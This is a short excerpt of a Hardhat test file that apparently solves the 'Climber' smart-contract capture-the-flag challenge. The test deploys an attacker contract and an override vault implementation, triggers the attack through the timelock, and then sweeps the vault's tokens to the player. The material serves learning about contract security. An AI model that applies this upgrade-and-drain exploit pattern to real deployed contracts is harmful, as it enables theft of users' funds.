...
describe('[Challenge] Climber', function () {
    ...
    before(async function () {
        ...
        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.reverted;
    ...
    it.only('Execution', async function () {
        ...
        const overrideClimberVaultContract = await (await ethers.getContractFactory('OverrideClimberVault', player)).deploy();
        const attackClimberVaultContract = await (await ethers.getContractFactory('AttackClimberVault', player)).deploy(timelock.address, vault.address);

        const tnx1 = await attackClimberVaultContract.attack(overrideClimberVaultContract.address)
        await tnx1.wait();

        const tnx2 = await vault.connect(player).sweepFunds(token.address);
        await tnx2.wait();
